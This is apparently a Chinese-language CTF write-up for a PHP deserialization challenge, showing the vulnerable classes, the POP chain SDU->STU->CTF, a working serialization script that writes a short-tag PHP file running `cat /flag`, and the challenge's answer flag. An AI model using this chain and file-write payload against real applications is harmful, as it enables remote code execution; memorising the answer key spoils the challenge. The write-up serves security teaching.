# easy_ser

> 分类：Web

## 题目描述

PHP 反序列化 POP 链构造。过滤了危险函数（eval、system、popen 等）和目录遍历符，且数据会被 16 字节分组处理。

## 考察知识点

- PHP 反序列化 POP 链
- 短标签命令执行（`<?=\`cmd\`;`）
- WAF 绕过（16 字节分组限制）

## 解法

源码要点：

```php
class STU {
    public $stu;
    public function __invoke() { echo $this->stu; }   // 触发 CTF::__toString
}
class SDU {
    public $Dazhuan;
    public function __wakeup() { $Dazhuan = $this->Dazhuan; $Dazhuan(); }  // 触发 STU::__invoke
}
class CTF {
    public $hackman; public $filename;
    public function __toString() {
        $data = Base64Decode($this->hackman);
        $filename = $this->filename;
        if (PassWAF1($data)) { echo "so dirty"; return; }   // 过滤 eval/system 等
        if (PassWAF3($filename)) { echo "just so so?"; return; }  // 过滤 ../ 和 /
        file_put_contents($filename, PassWAF2($data));  // 写入文件
        return "really!";
    }
}
```

PassWAF1 过滤危险函数，PassWAF2 每 16 字符分组（构造语句时字符不能太长，否则被分割导致无法执行），PassWAF3 过滤路径穿越符。

**POP 链**：`SDU::__wakeup -> STU::__invoke -> CTF::__toString`，利用短标签命令执行 `<?=\`cat /flag\`;` 写入文件。

构造脚本：

```php
<?php
class STU { public $stu; }
class SDU { public $Dazhuan; }
class CTF {
    public $hackman;
    public $filename = 'frank1q22.php';
}
$sdu = new SDU();
$stu = new STU();
$ctf = new CTF();
$sdu->Dazhuan = $stu;
$stu->stu = $ctf;
$ctf->hackman = "PD89YGNhdCAvZmxhZ2A7";  // <?=`cat /flag`; 的 base64
echo urlencode(serialize($sdu));
```

通过 POST `data` 参数传入序列化结果，然后访问写入的文件 `frank1q22.php` 得到 flag。

## 参考答案

`flag{f44ab7d7195a1f156aa2fbc1ceba61ec}`

## 来源

- 作者：frank1q22 | https://xz.aliyun.com/news/17083
- 作者：H轨迹H | https://www.cnblogs.com/GuijiH6/p/18680901
